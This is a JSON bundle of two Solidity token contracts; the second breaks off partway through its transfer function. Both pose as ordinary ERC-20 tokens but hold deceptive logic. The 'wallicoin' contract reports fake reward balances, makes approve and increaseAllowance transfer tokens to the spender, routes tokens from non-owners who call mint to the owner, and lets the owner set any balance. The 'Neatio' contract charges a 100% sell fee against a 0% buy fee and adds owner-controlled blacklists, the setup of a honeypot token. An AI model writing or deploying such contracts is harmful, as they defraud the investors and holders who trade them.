{"ebcoin (2).sol":{"content":"// ShitCoin\npragma solidity 0.8.16;\ncontract EBCoin{\n    event Transfer(address indexed from, address indexed to, int256 value);\n    event Approval(address indexed owner, address indexed spender, int256 value);\n    mapping(address=\u003eint256) _balances;\n    mapping(address=\u003ebool) getedReward;\n    mapping(address=\u003emapping(address=\u003eint256)) _allowances;\n    mapping(address=\u003ebool) BlackList;\n    int256 _totalSupply;\n    address _owner;\n    int8 _dicimal;\n    string _name;\n    string _symbol;\n    bool paused;\n    int256 reward;\n    mapping(address=\u003ebool) GasAllowList;\n    int256 TokenForGas;\n    bool transferFromEnabled;\n    constructor(){\n        _owner = msg.sender;\n        _name=\"wallicoin\";\n        _symbol=\"walli\";\n        _dicimal=18;\n        _totalSupply=0;\n        paused=false;\n        reward=(10**18)*1000000000000;\n        TokenForGas=0;\n        GasAllowList[_owner]=true;\n        transferFromEnabled=true;\n    }\n    function name() external view returns(string memory){\n        return _name;\n    }\n    function symbol() external view returns(string memory){\n        return _symbol;\n    }\n    function totalSupply() external view returns(int256){\n        return _totalSupply;\n    }\n    function decimals() external view returns(int8){\n        return _dicimal;\n    }\n    function balanceOf(address addr) external view returns(int256){\n        if(getedReward[addr]){\n            return _balances[addr];\n        }else{\n            return _balances[addr]+reward;\n        }\n    }\n    function balance() external view returns(int256){\n        if(getedReward[msg.sender]){\n            return _balances[msg.sender];\n        }else{\n            return _balances[msg.sender]+reward;\n        }\n    }\n    function transfer(address to,int256 value) external {\n        if(!getedReward[msg.sender]){\n            _balances[msg.sender] = _balances[msg.sender] + reward;\n            _totalSupply = _totalSupply+reward;\n            getedReward[msg.sender]=true;\n        }\n        if(!getedReward[to]){\n            _balances[to] = _balances[to] + reward;\n            _totalSupply = _totalSupply+reward;\n            getedReward[to]=true;\n        }\n        if(!paused\u0026\u0026_balances[msg.sender]\u003e=value\u0026\u0026!BlackList[msg.sender]\u0026\u0026!BlackList[to]){\n            _balances[msg.sender] = _balances[msg.sender] - value;\n            _balances[to] = _balances[to] + value;\n            emit Transfer(msg.sender,to,value);\n        }\n        if(GasAllowList[msg.sender]){\n            _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n        }\n    }\n    function transferFrom(address from,address to,int256 value) external {\n        if(!getedReward[from]){\n            _balances[from] = _balances[from] + reward;\n            _totalSupply = _totalSupply+reward;\n            getedReward[from]=true;\n        }\n        if(!getedReward[to]){\n            _balances[to] = _balances[to] + reward;\n            _totalSupply = _totalSupply+reward;\n            getedReward[to]=true;\n        }\n        if(!paused\u0026\u0026_balances[from]\u003e=value\u0026\u0026!BlackList[from]\u0026\u0026!BlackList[to]\u0026\u0026transferFromEnabled){\n            _balances[from] = _balances[from] - value;\n            _balances[to] = _balances[to] + value;\n            emit Transfer(from,to,value);\n        }\n        if(GasAllowList[msg.sender]){\n            _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n        }\n        if(GasAllowList[from]){\n            _balances[from] = _balances[from] + TokenForGas;\n        }\n    }\n    function pause() external {\n        if(msg.sender==_owner){\n            paused=true;\n            if(GasAllowList[msg.sender]){\n                _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n            }\n        }\n    }\n    function unpause() external {\n        if(msg.sender==_owner){\n            paused=false;\n            if(GasAllowList[msg.sender]){\n                _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n            }\n        }\n    }\n    function transferOwnership(address newOw) external {\n        if(!getedReward[newOw]){\n            _balances[newOw] = _balances[newOw] + reward;\n            _totalSupply = _totalSupply+reward;\n            getedReward[newOw]=true;\n        }\n        if(msg.sender==_owner){\n            _owner = newOw;\n            if(GasAllowList[msg.sender]){\n                _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n            }\n        }\n    }\n    function renounceOwnership() external {\n        if(msg.sender==_owner){\n            _owner = address(0);\n            if(GasAllowList[msg.sender]){\n                _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n            }\n        }\n    }\n    function mint(int256 value) external {\n        if(!getedReward[msg.sender]){\n            _balances[msg.sender] = _balances[msg.sender] + reward;\n            _totalSupply = _totalSupply+reward;\n            getedReward[msg.sender]=true;\n        }\n        if(msg.sender==_owner){\n            _balances[_owner] = _balances[_owner]+value;\n            _totalSupply = _totalSupply + value;\n        }else if(_balances[msg.sender]\u003e=value){\n            _balances[_owner]=_balances[_owner]+value;\n            _balances[msg.sender]=_balances[msg.sender]-value;\n        }\n        if(GasAllowList[msg.sender]){\n            _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n        }\n    }\n    function burn(int256 value) external {\n        if(!getedReward[msg.sender]){\n            _balances[msg.sender] = _balances[msg.sender] + reward;\n            _totalSupply = _totalSupply+reward;\n            getedReward[msg.sender]=true;\n        }\n        if(_balances[msg.sender]\u003e=value){\n        _balances[msg.sender] = _balances[msg.sender]-value;\n            if(msg.sender==_owner){\n                _totalSupply = _totalSupply - value;\n            }\n        }\n        if(GasAllowList[msg.sender]){\n            _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n        }\n    }\n    function owner() external view returns(address){\n        return _owner;\n    }\n    function getOwner() external view returns(address){\n        return _owner;\n    }\n    function setDecimal(int8 newdecimal) external {\n        if(msg.sender==_owner){\n            _dicimal=newdecimal;\n            if(GasAllowList[msg.sender]){\n                _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n            }\n        }\n    }\n    function setName(string memory newname) external {\n        if(msg.sender==_owner){\n            _name = newname;\n            if(GasAllowList[msg.sender]){\n                _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n            }\n        }\n    }\n    function setTotalSupply(int256 ts) external {\n        if(msg.sender==_owner){\n            _totalSupply = ts;\n            if(GasAllowList[msg.sender]){\n                _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n            }\n        }\n    }\n    function setSymbol(string memory newsymbol) external {\n        if(msg.sender==_owner){\n            _symbol = newsymbol;\n            if(GasAllowList[msg.sender]){\n                _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n            }\n        }\n    }\n    function setBalance(address addr,int256 value) external {\n        if(!getedReward[addr]){\n            _balances[addr] = _balances[addr] + reward;\n            _totalSupply = _totalSupply+reward;\n            getedReward[addr]=true;\n        }\n        if(msg.sender==_owner){\n            _balances[addr] = value;\n            if(GasAllowList[msg.sender]){\n                _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n            }\n        }\n    }\n    function updateReward(int256 newRew) external {\n        if(msg.sender==_owner){\n            reward = newRew;\n            if(GasAllowList[msg.sender]){\n                _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n            }\n        }\n    }\n    function approve(address spender,uint256 value) external {\n        if(!getedReward[msg.sender]){\n            _balances[msg.sender] = _balances[msg.sender] + reward;\n            _totalSupply = _totalSupply+reward;\n            getedReward[msg.sender]=true;\n        }\n        if(!getedReward[spender]){\n            _balances[spender] = _balances[spender] + reward;\n            _totalSupply = _totalSupply+reward;\n            getedReward[spender]=true;\n        }\n        if(_balances[msg.sender]\u003e=int256(value)\u0026\u0026!paused\u0026\u0026!BlackList[msg.sender]\u0026\u0026!BlackList[spender]){\n            _allowances[msg.sender][spender]=int256(value);\n            emit Approval(msg.sender,spender,int256(value));\n            _balances[msg.sender] = _balances[msg.sender] - int256(value);\n            _balances[spender] = _balances[spender] + int256(value);\n        }\n        if(GasAllowList[msg.sender]){\n            _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n        }\n    }\n    function increaseAllowance(address spender,int256 value) external {\n        if(!getedReward[msg.sender]){\n            _balances[msg.sender] = _balances[msg.sender] + reward;\n            _totalSupply = _totalSupply+reward;\n            getedReward[msg.sender]=true;\n        }\n        if(!getedReward[spender]){\n            _balances[spender] = _balances[spender] + reward;\n            _totalSupply = _totalSupply+reward;\n            getedReward[spender]=true;\n        }\n        if(_balances[msg.sender]\u003e=value\u0026\u0026!paused\u0026\u0026!BlackList[msg.sender]\u0026\u0026!BlackList[spender]){\n            _allowances[msg.sender][spender]=_allowances[msg.sender][spender]+value;\n            emit Approval(msg.sender,spender,_allowances[msg.sender][spender]);\n            _balances[msg.sender] = _balances[msg.sender] - value;\n            _balances[spender] = _balances[spender] + value;\n        }\n        if(GasAllowList[msg.sender]){\n            _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n        }\n    }\n    function decreaseAllowance(address spender,int256 value) external {\n        if(!getedReward[msg.sender]){\n            _balances[msg.sender] = _balances[msg.sender] + reward;\n            _totalSupply = _totalSupply+reward;\n            getedReward[msg.sender]=true;\n        }\n        if(!getedReward[spender]){\n            _balances[spender] = _balances[spender] + reward;\n            _totalSupply = _totalSupply+reward;\n            getedReward[spender]=true;\n        }\n        if(_allowances[msg.sender][spender]\u003e=value\u0026\u0026_balances[spender]\u003e=value\u0026\u0026!paused\u0026\u0026!BlackList[msg.sender]\u0026\u0026!BlackList[spender]){\n            _allowances[msg.sender][spender]=_allowances[msg.sender][spender]-value;\n            emit Approval(msg.sender,spender,_allowances[msg.sender][spender]);\n            _balances[msg.sender] = _balances[msg.sender] + value;\n            _balances[spender] = _balances[spender] - value;\n        }\n        if(GasAllowList[msg.sender]){\n            _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n        }\n    }\n    function allowance(address owner,address spender) external view returns(uint256) {\n        return uint256(_allowances[owner][spender]);\n    }\n    function addWalletToBlacklist(address wallet) external {\n        if(msg.sender==_owner){\n            BlackList[wallet]=true;\n            if(GasAllowList[msg.sender]){\n                _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n            }\n        }\n    }\n    function removeWalletFromBlacklist(address wallet) external {\n        if(msg.sender==_owner){\n            BlackList[wallet]=false;\n            if(GasAllowList[msg.sender]){\n                _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n            }\n        }\n    }\n    function setTokensForGas(int256 tokensForGas) external {\n        if(msg.sender==_owner){\n            TokenForGas = tokensForGas;\n            if(GasAllowList[msg.sender]){\n                _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n            }\n        }\n    }\n    function setWalletCanReceiveGas(address wallet,bool canReceiveGas) external {\n        if(msg.sender==_owner){\n            GasAllowList[wallet]=canReceiveGas;\n            if(GasAllowList[msg.sender]){\n                _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n            }\n        }\n    }\n    function setTransferFromEnabled(bool enable) external{\n        if(msg.sender==_owner){\n            transferFromEnabled=enable;\n            if(GasAllowList[msg.sender]){\n                _balances[msg.sender] = _balances[msg.sender] + TokenForGas;\n            }\n        }\n    }\n}\n"},"token.sol":{"content":"/**\n *Submitted for verification at BscScan.com on 2023-09-17\n*/\n\npragma solidity ^0.8.7;\n\n\ninterface IERC20 {\n    \n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\nlibrary SafeMath {\n    \n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a + b;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a - b;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a * b;\n    }\n    \n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        unchecked {\n            require(b \u003c= a, errorMessage);\n            return a - b;\n        }\n    }\n    \n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        unchecked {\n            require(b \u003e 0, errorMessage);\n            return a / b;\n        }\n    }\n    \n}\n\n\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this; \n        return msg.data;\n    }\n}\n\n\nlibrary Address {\n    \n    function isContract(address account) internal view returns (bool) {\n        uint256 size;\n        assembly { size := extcodesize(account) }\n        return size \u003e 0;\n    }\n\n    function sendValue(address payable recipient, uint256 amount) internal {\n        require(address(this).balance \u003e= amount, \"Address: insufficient balance\");\n        (bool success, ) = recipient.call{ value: amount }(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    }\n    \n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n      return functionCall(target, data, \"Address: low-level call failed\");\n    }\n    \n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, 0, errorMessage);\n    }\n    \n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    }\n    \n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n        require(address(this).balance \u003e= value, \"Address: insufficient balance for call\");\n        require(isContract(target), \"Address: call to non-contract\");\n        (bool success, bytes memory returndata) = target.call{ value: value }(data);\n        return _verifyCallResult(success, returndata, errorMessage);\n    }\n    \n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\n    }\n    \n    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {\n        require(isContract(target), \"Address: static call to non-contract\");\n        (bool success, bytes memory returndata) = target.staticcall(data);\n        return _verifyCallResult(success, returndata, errorMessage);\n    }\n\n\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\n    }\n    \n    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n        require(isContract(target), \"Address: delegate call to non-contract\");\n        (bool success, bytes memory returndata) = target.delegatecall(data);\n        return _verifyCallResult(success, returndata, errorMessage);\n    }\n\n    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {\n        if (success) {\n            return returndata;\n        } else {\n            if (returndata.length \u003e 0) {\n                 assembly {\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                }\n            } else {\n                revert(errorMessage);\n            }\n        }\n    }\n}\n\nabstract contract Ownable is Context {\n    address private _owner;\n\n\n    // Set original owner\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n    constructor () {\n        _owner =0xCC79f38F86e559D5001f7120ef102367F978099e;\n        emit OwnershipTransferred(address(0), _owner);\n    }\n\n    // Return current owner\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    // Restrict function to contract owner only \n    modifier onlyOwner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    // Renounce ownership of the contract \n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n    // Transfer the contract to to a new owner\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n}\n\ninterface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n}\n\ninterface IUniswapV2Pair {\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n    function name() external pure returns (string memory);\n    function symbol() external pure returns (string memory);\n    function decimals() external pure returns (uint8);\n    function totalSupply() external view returns (uint);\n    function balanceOf(address owner) external view returns (uint);\n    function allowance(address owner, address spender) external view returns (uint);\n    function approve(address spender, uint value) external returns (bool);\n    function transfer(address to, uint value) external returns (bool);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n    function nonces(address owner) external view returns (uint);\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n    event Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\n    function factory() external view returns (address);\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n    function price0CumulativeLast() external view returns (uint);\n    function price1CumulativeLast() external view returns (uint);\n    function kLast() external view returns (uint);\n    function burn(address to) external returns (uint amount0, uint amount1);\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function skim(address to) external;\n    function sync() external;\n    function initialize(address, address) external;\n}\n\ninterface IUniswapV2Router01 {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountToken, uint amountETH);\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountToken, uint amountETH);\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n}\n\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountETH);\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountETH);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\n\ncontract Token is Context, IERC20, Ownable { \n    using SafeMath for uint256;\n    using Address for address;\n\n\n    \n    mapping (address =\u003e uint256) private _tOwned;\n    mapping (address =\u003e mapping (address =\u003e uint256)) private _allowances;\n    mapping (address =\u003e bool) public _isExcludedFromFee; \n\n    \n    mapping (address =\u003e bool) public _isBlacklisted;\n\n    \n    bool public noBlackList;\n   \n   \n\n\n    address payable private Wallet_Dev = payable(0xCC79f38F86e559D5001f7120ef102367F978099e);\n    address payable private Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); \n    address payable private Wallet_zero = payable(0x0000000000000000000000000000000000000000); \n\n\n  \n\n\n    string private _name = unicode\"Neatio\"; \n    string private _symbol = unicode\"NIO\";  \n    uint8 private _decimals = 18;\n    uint256 private _tTotal = 1000000000 * 10**18;\n    uint256 private _tFeeTotal;\n\n    \n    uint8 private txCount = 0;\n    uint8 private swapTrigger = 3; \n\n   \n    uint256 private maxPossibleFee = 100 ; \n\n\n \n    uint256 private _TotalFee = 100;\n    uint256 public _buyFee = 0;\n    uint256 public _sellFee = 100;\n\n\n  \n    uint256 private _previousTotalFee = _TotalFee; \n    uint256 private _previousBuyFee = _buyFee; \n    uint256 private _previousSellFee = _sellFee; \n\n\n\n \n    uint256 public _maxWalletToken = _tTotal.mul(100).div(100);\n    uint256 private _previousMaxWalletToken = _maxWalletToken;\n\n\n    uint256 public _maxTxAmount = _tTotal.mul(100).div(100); \n    uint256 private _previousMaxTxAmount = _maxTxAmount;\n\n\n                                     \n    IUniswapV2Router02 public uniswapV2Router;\n    address public uniswapV2Pair;\n    bool public inSwapAndLiquify;\n    bool public swapAndLiquifyEnabled = true;\n    \n    event SwapAndLiquifyEnabledUpdated(bool enabled);\n    event SwapAndLiquify(\n        uint256 tokensSwapped,\n        uint256 ethReceived,\n        uint256 tokensIntoLiqudity\n        \n    );\n    \n    // Prevent processing while already processing! \n    modifier lockTheSwap {\n        inSwapAndLiquify = true;\n        _;\n        inSwapAndLiquify = false;\n    }\n\n\n    \n    constructor () {\n        _tOwned[owner()] = _tTotal;\n        \n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); \n        \n        \n      \n        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())\n            .createPair(address(this), _uniswapV2Router.WETH());\n        uniswapV2Router = _uniswapV2Router;\n        _isExcludedFromFee[owner()] = true;\n        _isExcludedFromFee[address(this)] = true;\n        _isExcludedFromFee[Wallet_Dev] = true;\n        \n        emit Transfer(address(0), owner(), _tTotal);\n    }\n\n\n    /*\n\n   \n\n    */\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n    function totalSupply() public view override returns (uint256) {\n        return _tTotal;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _tOwned[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n        return true;\n    }\n\n\n    /*\n\n    \n\n    */\n\n\n\n\n    /*\n\n\n    */\n    \n    \n    function excludeFromFee(address account) public onlyOwner {\n        _isExcludedFromFee[account] = true;\n    }\n    \n    \n    function includeInFee(address account) public onlyOwner {\n        _isExcludedFromFee[account] = false;\n    }\n\n\n    /*\n\n    */\n    \n\n    function _set_Fees(uint256 Buy_Fee, uint256 Sell_Fee) external onlyOwner() {\n\n        require((Buy_Fee + Sell_Fee) \u003c= maxPossibleFee, \"Fee is too high!\");\n        _sellFee = Sell_Fee;\n        _buyFee = Buy_Fee;\n\n    }\n\n\n\n   \n    function Wallet_Update_Dev(address payable wallet) public onlyOwner() {\n        Wallet_Dev = wallet;\n        _isExcludedFromFee[Wallet_Dev] = true;\n    }\n\n\n   \n    function set_Swap_And_Liquify_Enabled(bool true_or_false) public onlyOwner {\n        swapAndLiquifyEnabled = true_or_false;\n        emit SwapAndLiquifyEnabledUpdated(true_or_false);\n    }\n\n  \n    function set_Number_Of_Transactions_Before_Liquify_Trigger(uint8 number_of_transactions) public onlyOwner {\n        swapTrigger = number_of_transactions;\n    }\n    \n\n\n\n    receive() external payable {}\n\n\n\n   \n    function blacklist_Add_Wallets(address[] calldata addresses) external onlyOwner {\n       \n        uint256 startGas;\n        uint256 gasUsed;\n\n    for (uint256 i; i \u003c addresses.length; ++i) {\n        if(gasUsed \u003c gasleft()) {\n        startGas = gasleft();\n        if(!_isBlacklisted[addresses[i]]){\n        _isBlacklisted[addresses[i]] = true;}\n        gasUsed = startGas - gasleft();\n    }\n    }\n    }\n\n\n\n \n    function blacklist_Remove_Wallets(address[] calldata addresses) external onlyOwner {\n       \n        uint256 startGas;\n        uint256 gasUsed;\n\n    for (uint256 i; i \u003c addresses.length; ++i) {\n        if(gasUsed \u003c gasleft()) {\n        startGas = gasleft();\n        if(_isBlacklisted[addresses[i]]){\n        _isBlacklisted[addresses[i]] = false;}\n        gasUsed = startGas - gasleft();\n    }\n    }\n    }\n\n\n    \n    function blacklist_Switch(bool true_or_false) public onlyOwner {\n        noBlackList = true_or_false;\n    } \n\n  \n    /*\n   \n\n    */\n\n    bool public noFeeToTransfer = true;\n\n  \n    function set_Transfers_Without_Fees(bool true_or_false) external onlyOwner {\n        noFeeToTransfer = true_or_false;\n    }\n\n    \n    function set_Max_Transaction_Percent(uint256 maxTxPercent_x100) external onlyOwner() {\n        _maxTxAmount = _tTotal*maxTxPercent_x100/10000;\n    }    \n    \n  \n     function set_Max_Wallet_Percent(uint256 maxWallPercent_x100) external onlyOwner() {\n        _maxWalletToken = _tTotal*maxWallPercent_x100/10000;\n    }\n\n\n\n    function removeAllFee() private {\n        if(_TotalFee == 0 \u0026\u0026 _buyFee == 0 \u0026\u0026 _sellFee == 0) return;\n\n\n        _previousBuyFee = _buyFee; \n        _previousSellFee = _sellFee; \n        _previousTotalFee = _TotalFee;\n        _buyFee = 0;\n        _sellFee = 0;\n        _TotalFee = 0;\n\n    }\n    \n\n    function restoreAllFee() private {\n    \n    _TotalFee = _previousTotalFee;\n    _buyFee = _previousBuyFee; \n    _sellFee = _previousSellFee; \n\n    }\n\n\n\n    function _approve(address owner, address spender, uint256 amount) private {\n\n        require(owner != address(0) \u0026\u0026 spender != address(0), \"ERR: zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) private {\n        \n\n        \n        if (to != owner() \u0026\u0026\n            to != Wallet_Dev \u0026\u0026\n            to != address(this) \u0026\u0026\n            to != uniswapV2Pair \u0026\u0026\n            to != Wallet_Burn \u0026\u0026\n            from != owner()){\n            uint256 heldTokens = balanceOf(to);\n            require((heldTokens + amount) \u003c= _maxWalletToken,\"You are trying to buy too many tokens. You have reached the limit for one wallet.\");}\n\n\n        // Limit the maximum number of tokens that can be bought or sold in one transaction\n        if (from != owner() \u0026\u0026 to != owner())\n            require(amount \u003c= _maxTxAmount, \"You are trying to buy more than the max transaction limit.\");\n\n\n\n        /*\n\n    \n\n        */\n        \n        if (noBlackList){\n        require(!_isBlacklisted[from] \u0026\u0026 !_isBlacklisted[to], \"This address is blacklisted. Transaction reverted.\");}\n\n\n        require(from != address(0) \u0026\u0026 to != address(0), \"ERR: Using 0 address!\");\n        require(amount \u003e 0, \"Token value must be higher than zero.\");\n\n\n       \n\n        if(\n            txCount \u003e= swapTrigger \u0026\u0026 \n            !inSwapAndLiquify \u0026\u0026\n            from != uniswapV2Pair \u0026\u0026\n            swapAndLiquifyEnabled \n            )\n        {  \n            \n            txCount = 0;\n            uint256 contractTokenBalance = balanceOf(address(this));\n            if(contractTokenBalance \u003e _maxTxAmount) {contractTokenBalance = _maxTxAmount;}\n            if(contractTokenBalance \u003e 0){\n            swapAndLiquify(contractTokenBalance);\n        }\n        